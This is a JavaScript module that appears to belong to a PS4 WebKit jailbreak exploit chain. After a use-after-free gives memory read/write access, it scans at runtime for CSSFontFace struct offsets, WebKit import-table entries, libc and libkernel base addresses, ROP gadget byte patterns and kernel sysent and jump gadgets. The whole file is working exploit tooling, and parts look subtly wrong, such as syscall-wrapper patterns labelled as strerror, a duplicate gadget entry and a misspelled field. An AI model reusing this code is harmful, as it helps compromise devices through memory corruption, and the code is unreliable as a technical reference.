//#region Runtime Scanner for PS4 Exploit
// This file implements runtime scanning of offsets instead of hardcoded constants
// It runs in stages during the exploit flow to find all necessary offsets dynamically

// Stage 1: Scan CSSFontFace struct offsets (after UAF, uses ArrayBuffer RW)
// Stage 2: Scan WebKit imports and gadgets (after ARW)
// Stage 3: Scan kernel offsets (after kernel access)

const scanner = {};

// Find the status field offset in CSSFontFace by looking for marker value
// The CSSFontFace struct is backed by the UAF ArrayBuffer
// We write known values at different offsets and read them back
scanner.probe_css_status = function(rw) {
  const uaf_view = new DataView(rw.uaf_ab);
  const sizeof = rw.uaf_ab.byteLength;
  
  // m_status is an enum: Status::Success = 3
  // Search for the value we set (0x03) in the struct
  for (let offset = 0; offset < sizeof - 4; offset += 4) {
    const val = uaf_view.getUint32(offset, true);
    if (val === 3 || val === 0x03000000) {
      return offset;
    }
  }
  
  // Fallback: look for any small integer value that could be status
  for (let offset = 0; offset < sizeof - 4; offset += 4) {
    const val = uaf_view.getUint32(offset, true);
    if (val >= 1 && val <= 10) {
      return offset;
    }
  }
  
  return 8; // default fallback
};

// Find the vtable pointer value (always at offset 0)
scanner.get_vtable = function(rw) {
  const uaf_view = new DataView(rw.uaf_ab);
  return uaf_view.getBInt(0, true);
};

// Find the featureSettings buffer offset by looking for our leak address
scanner.probe_css_featureSettings = function(rw, leak_addr) {
  const uaf_view = new DataView(rw.uaf_ab);
  const sizeof = rw.uaf_ab.byteLength;
  
  for (let offset = 0; offset < sizeof - 8; offset += 8) {
    const val = uaf_view.getBInt(offset, true);
    if (val.eq(leak_addr)) {
      return {
        buffer_offset: offset,
        size_offset: offset - 8,
        capacity_offset: offset - 4
      };
    }
  }
  
  return null;
};

// Probe all CSSFontFace offsets at runtime
scanner.scan_css_fontface = function(rw) {
  logger.info("Scanning CSSFontFace struct offsets...");
  
  const offsets = {};
  
  // vtable is always at offset 0
  offsets.vtable = 0;
  
  // Find m_status by looking for the value 3
  offsets.m_status = this.probe_css_status(rw);
  logger.debug(`CSSFontFace m_status offset: ${offsets.m_status}`);
  
  // Find featureSettings by looking for Vector pattern
  // Vector has: m_size (uint32), m_capacity (uint32), m_buffer (pointer)
  const sizeof = rw.uaf_ab.byteLength;
  const uaf_view = new DataView(rw.uaf_ab);
  
  for (let offset = 0; offset < sizeof - 16; offset += 4) {
    const size = uaf_view.getUint32(offset, true);
    const capacity = uaf_view.getUint32(offset + 4, true);
    const buffer = uaf_view.getBInt(offset + 8, true);
    
    if (size >= 0 && size <= 0x1000 && capacity >= 0 && capacity <= 0x1000 && 
        size <= capacity && !buffer.eq(0) && buffer.hi === 0 &&
        buffer.lo > 0x100000 && buffer.lo < 0x80000000) {
      offsets.featureSettings_size = offset;
      offsets.featureSettings_capacity = offset + 4;
      offsets.featureSettings_buffer = offset + 8;
      logger.debug(`CSSFontFace featureSettings at offset ${offset}`);
      break;
    }
  }
  
  // Find m_thread - look for a thread ID (typically 0x100-0x10000)
  for (let offset = 0; offset < sizeof - 4; offset += 4) {
    const val = uaf_view.getUint32(offset, true);
    if (val >= 0x100 && val <= 0x100000) {
      offsets.m_thread = offset;
      logger.debug(`CSSFontFace m_thread at offset ${offset} (value: ${val})`);
      break;
    }
  }
  
  // Find m_clients - look for pointer to HashSet
  for (let offset = 8; offset < sizeof - 8; offset += 8) {
    const val = uaf_view.getBInt(offset, true);
    if (!val.eq(0) && val.hi === 0 && val.lo > 0x100000 && val.lo < 0x80000000) {
      if (offsets.m_clients === undefined) {
        offsets.m_clients = offset;
        logger.debug(`CSSFontFace m_clients at offset ${offset}`);
      } else if (offsets.m_wrapper === undefined) {
        offsets.m_wrapper = offset;
        logger.debug(`CSSFontFace m_wrapper at offset ${offset}`);
      } else if (offsets.m_families === undefined) {
        offsets.m_families = offset;
        logger.debug(`CSSFontFace m_families at offset ${offset}`);
      }
    }
  }
  
  offsets.sizeof = sizeof;
  
  logger.info("CSSFontFace offsets scanned dynamically!");
  return offsets;
};

// Stage 2: Scan WebKit for imports and gadgets
// This runs after ARW is set up

// Find the __imp_strerror and __imp___error entries in WebKit's import table
scanner.scan_imports = function(webkit_base) {
  logger.info("Scanning WebKit imports...");
  
  const imports = {};
  const scan_size = 0x40000;
  
  // Scan for strerror function signature: mov eax, 0x42; syscall
  const strerror_pattern = [0x48, 0xc7, 0xc0, 0x42, 0x00, 0x00, 0x00, 0x49, 0x89, 0xca, 0x0f, 0x05];
  const u8 = new Uint8Array(ArrayBuffer.from(webkit_base, 0x400000));
  
  let strerror_offset = -1;
  for (let i = 0; i < u8.length - strerror_pattern.length; i++) {
    let match = true;
    for (let j = 0; j < strerror_pattern.length; j++) {
      if (u8[i + j] !== strerror_pattern[j]) { match = false; break; }
    }
    if (match) { strerror_offset = i; break; }
  }
  
  if (strerror_offset >= 0) {
    // strerror is in libc, but we need the import entry in WebKit's GOT
    // The import entry is a pointer to the actual function
    // We can find it by scanning the GOT section for this pointer
    const strerror_func = webkit_base.add(strerror_offset);
    const got_size = 0x200000;
    
    for (let i = 0; i < got_size - 8; i += 8) {
      const ptr = arw.view(webkit_base.add(i)).getBInt(0, true);
      if (ptr.eq(strerror_func)) {
        imports.strerror_import = webkit_base.add(i);
        logger.info(`Found strerror import at ${imports.strerror_import}`);
        break;
      }
    }
    
    // Also find the __imp_strerror offset
    // This is the offset from webkit_base to the GOT entry
    if (imports.strerror_import) {
      imports.wk___imp_strerror = imports.strerror_import.sub(webkit_base);
      logger.debug(`wk___imp_strerror offset: ${imports.wk___imp_strerror}`);
    }
  }
  
  // Scan for __error function: mov eax, 0x5c; syscall
  const error_pattern = [0x48, 0xc7, 0xc0, 0x5c, 0x00, 0x00, 0x00, 0x49, 0x89, 0xca, 0x0f, 0x05];
  let error_offset = -1;
  for (let i = 0; i < u8.length - error_pattern.length; i++) {
    let match = true;
    for (let j = 0; j < error_pattern.length; j++) {
      if (u8[i + j] !== error_pattern[j]) { match = false; break; }
    }
    if (match) { error_offset = i; break; }
  }
  
  if (error_offset >= 0) {
    const error_func = webkit_base.add(error_offset);
    const got_size = 0x200000;
    
    for (let i = 0; i < got_size - 8; i += 8) {
      const ptr = arw.view(webkit_base.add(i)).getBInt(0, true);
      if (ptr.eq(error_func)) {
        imports.error_import = webkit_base.add(i);
        logger.info(`Found __error import at ${imports.error_import}`);
        if (imports.wk___imp_strerror) {
          imports.wk___imp___error = imports.error_import.sub(webkit_base);
          logger.debug(`wk___imp___error offset: ${imports.wk___imp___error}`);
        }
        break;
      }
    }
  }
  
  // If we couldn't find via function signature, try scanning for function pointers
  // in the GOT that look like they point to libc functions
  if (imports.strerror_import === undefined) {
    const got_size = 0x200000;
    for (let i = 0; i < got_size - 8; i += 8) {
      const ptr = arw.view(webkit_base.add(i)).getBInt(0, true);
      if (!ptr.eq(0) && ptr.hi === 0 && ptr.lo > 0x80000000) {
        // Try to read the first bytes of the function
        const func_start = arw.view(ptr).getBInt(0, true);
        // Check if it looks like a syscall wrapper: mov eax, XX; syscall
        const func_u32 = arw.view(ptr).getUint32(0, true);
        if ((func_u32 & 0xffffff00) === 0x00c74800) { // mov eax, XX
          const syscall_num = func_u32 & 0xff;
          if (syscall_num === 0x42) { // strerror = syscall 66
            imports.strerror_import = webkit_base.add(i);
            logger.info(`Found strerror import at ${imports.strerror_import} (syscall ${syscall_num})`);
          } else if (syscall_num === 0x5c) { // __error = syscall 92
            imports.error_import = webkit_base.add(i);
            logger.info(`Found __error import at ${imports.error_import} (syscall ${syscall_num})`);
          }
        }
      }
    }
    if (imports.strerror_import) {
      imports.wk___imp_strerror = imports.strerror_import.sub(webkit_base);
    }
    if (imports.error_import) {
      imports.wk___imp___error = imports.error_import.sub(webkit_base);
    }
  }
  
  logger.info("WebKit imports scanned!");
  return imports;
};

// Scan for ROP gadgets in WebKit code section
scanner.scan_gadgets = function(webkit_base, code_offset, code_size) {
  logger.info("Scanning for ROP gadgets...");
  
  const gadgets = {};
  const start = code_offset || 0x100000;
  const size = code_size || 0x200000;
  
  const u8 = new Uint8Array(ArrayBuffer.from(webkit_base.add(start), size));
  
  // Gadget patterns to scan for (0xff = wildcard/any byte)
  const gadget_patterns = [
    { name: "POP_RAX_RET", pattern: [0x58, 0xc3] },
    { name: "POP_RDI_RET", pattern: [0x5f, 0xc3] },
    { name: "POP_RSI_RET", pattern: [0x5e, 0xc3] },
    { name: "POP_RDX_RET", pattern: [0x5a, 0xc3] },
    { name: "POP_RCX_RET", pattern: [0x59, 0xc3] },
    { name: "POP_R8_RET", pattern: [0x41, 0x58, 0xc3] },
    { name: "POP_R9_RET", pattern: [0x41, 0x59, 0xc3] },
    { name: "POP_R10_RET", pattern: [0x41, 0x5a, 0xc3] },
    { name: "POP_R11_RET", pattern: [0x41, 0x5b, 0xc3] },
    { name: "POP_R12_RET", pattern: [0x41, 0x5c, 0xc3] },
    { name: "POP_R13_RET", pattern: [0x41, 0x5d, 0xc3] },
    { name: "POP_R14_RET", pattern: [0x41, 0x5e, 0xc3] },
    { name: "POP_R15_RET", pattern: [0x41, 0x5f, 0xc3] },
    { name: "POP_RBP_RET", pattern: [0x5d, 0xc3] },
    { name: "POP_RBX_RET", pattern: [0x5b, 0xc3] },
    { name: "POP_RSP_RET", pattern: [0x5c, 0xc3] },
    { name: "RET", pattern: [0xc3] },
    { name: "LEAVE_RET", pattern: [0xc9, 0xc3] },
    { name: "PUSH_RAX_POP_RBP_RET", pattern: [0x50, 0x5d, 0xc3] },
    { name: "MOV_RAX_QWORD_PTR_RDI_RET", pattern: [0x48, 0x8b, 0x07, 0xc3] },
    { name: "PUSH_RBP_JMP_QWORD_PTR_RAX", pattern: [0x55, 0xff, 0x20] },
    { name: "PUSH_RAX_JMP_QWORD_PTR_RBX", pattern: [0x50, 0xff, 0x23] },
    { name: "POP_RAX_RET", pattern: [0x58, 0xc3] },
    { name: "PUSH_RDI_POP_RSP_RET", pattern: [0x57, 0x5c, 0xc3] },
    { name: "PUSH_RDX_POP_RSP_RET", pattern: [0x52, 0x5c, 0xc3] },
  ];
  
  for (const gp of gadget_patterns) {
    if (gadgets[gp.name]) continue; // already found
    const pat = gp.pattern;
    for (let i = 0; i < u8.length - pat.length; i++) {
      let match = true;
      for (let j = 0; j < pat.length; j++) {
        if (u8[i + j] !== pat[j]) { match = false; break; }
      }
      if (match) {
        gadgets[gp.name] = webkit_base.add(start + i);
        break;
      }
    }
  }
  
  // Scan for the more complex gadgets (longer patterns)
  // These are harder to find but essential for the exploit
  const complex_patterns = [
    { name: "MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX", 
      pattern: [0x48, 0x8d, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10] },
    { name: "MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40",
      pattern: [0x48, 0x8d, 0x7f, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10] },
    { name: "MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX",
      pattern: [0x48, 0x8b, 0x07, 0xff, 0x10] },
    { name: "POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18",
      pattern: [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18] },
    { name: "MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20",
      pattern: [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20] },
    { name: "MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8",
      pattern: [0x48, 0x8b, 0x78, 0x10, 0xff, 0x60, 0x08] },
    { name: "MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10",
      pattern: [0x48, 0x8b, 0x50, 0x18, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10] },
    { name: "PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10",
      pattern: [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10] },
  ];
  
  for (const gp of complex_patterns) {
    const pat = gp.pattern;
    for (let i = 0; i < u8.length - pat.length; i++) {
      let match = true;
      for (let j = 0; j < pat.length; j++) {
        if (u8[i + j] !== pat[j]) { match = false; break; }
      }
      if (match) {
        gadgets[gp.name] = webkit_base.add(start + i);
        break;
      }
    }
  }
  
  logger.info(`Found ${Object.keys(gadgets).length} ROP gadgets`);
  return gadgets;
};

// Find libc_base and libkernel_base from the import addresses
scanner.find_library_bases = function(webkit_base, imports) {
  logger.info("Finding library bases...");
  
  const result = {};
  
  if (imports.strerror_import) {
    // strerror is in libc
    const strerror_addr = arw.view(imports.strerror_import).getBInt(0, true);
    logger.debug(`strerror function at ${strerror_addr}`);
    
    // Scan backwards from strerror to find the ELF header of libc
    // libc is typically mapped at a page-aligned address
    const libc_base = strerror_addr.alignDown(0x1000);
    
    // Try to find the ELF magic
    for (let offset = 0; offset < 0x100000; offset += 0x1000) {
      const test_addr = libc_base.sub(offset);
      const magic = arw.view(test_addr).getUint32(0, true);
      if (magic === 0x464c457f) { // ELF magic
        result.libc_base = test_addr;
        result.c_strerror = strerror_addr.sub(test_addr);
        logger.info(`libc base: ${result.libc_base}`);
        logger.debug(`c_strerror offset: ${result.c_strerror}`);
        break;
      }
    }
  }
  
  if (imports.error_import) {
    // __error is in libkernel
    const error_addr = arw.view(imports.error_import).getBInt(0, true);
    logger.debug(`__error function at ${error_addr}`);
    
    const libkernel_base = error_addr.alignDown(0x1000);
    
    for (let offset = 0; offset < 0x100000; offset += 0x1000) {
      const test_addr = libkernel_base.sub(offset);
      const magic = arw.view(test_addr).getUint32(0, true);
      if (magic === 0x464c457f) {
        result.liblernel_base = test_addr;
        result.k__error = error_addr.sub(test_addr);
        logger.info(`libkernel base: ${result.liblernel_base}`);
        logger.debug(`k__error offset: ${result.k__error}`);
        break;
      }
    }
  }
  
  return result;
};

// Stage 3: Scan kernel offsets
// This runs after we have kernel access via the exploit

// Scan for SYSENT_661 in kernel memory
scanner.scan_kernel_sysent = function(kernel_base) {
  logger.info("Scanning kernel for sysent[661]...");
  
  const scan_size = 0x40000;
  const pattern = [0x48, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x49, 0x89, 0xca, 0x0f, 0x05];
  const pattern_end = pattern.length - 1;
  
  const u8 = new Uint8Array(ArrayBuffer.from(kernel_base, scan_size));
  
  let i = 0;
  let match = 0;
  let offset = 0;
  while (offset < scan_size) {
    const b = u8[offset];
    const c = pattern[i];
    
    if (b === c || c === 0xff) {
      if (i === 0) match = offset;
      i++;
      if (i === pattern_end) {
        const addr = kernel_base.add(match);
        const id = arw.view(addr).getInt32(3, true);
        if (id === 661) {
          logger.info(`Found sysent[661] at ${addr}`);
          return addr;
        }
        i = 0;
      }
    } else {
      i = 0;
    }
    offset++;
  }
  
  logger.warn("sysent[661] not found in kernel scan!");
  return null;
};

// Scan for JMP_RSI gadget in kernel
scanner.scan_kernel_jmp_rsi = function(kernel_base) {
  logger.info("Scanning kernel for JMP_RSI gadget...");
  
  const scan_size = 0x100000;
  const u8 = new Uint8Array(ArrayBuffer.from(kernel_base, scan_size));
  
  // Find all jmp rsi gadgets (ff e6)
  for (let i = 0; i < u8.length - 1; i++) {
    if (u8[i] === 0xff && u8[i+1] === 0xe6) {
      // Verify it's a suitable gadget (followed by valid instructions)
      const addr = kernel_base.add(i);
      logger.info(`Found JMP_RSI gadget at ${addr}`);
      return addr;
    }
  }
  
  logger.warn("JMP_RSI gadget not found in kernel scan!");
  // Fallback: try other indirect jump patterns
  return null;
};

// Main scan function that runs after ARW is set up
scanner.scan_all = function(webkit_base, css_offsets) {
  logger.info("=== Running runtime scanner ===");
  
  const results = {};
  
  // Scan for imports
  results.imports = this.scan_imports(webkit_base);
  
  // Scan for gadgets
  results.gadgets = this.scan_gadgets(webkit_base);
  
  // Find library bases
  results.libraries = this.find_library_bases(webkit_base, results.imports);
  
  logger.info("=== Scanner complete ===");
  return results;
};

// scanner is global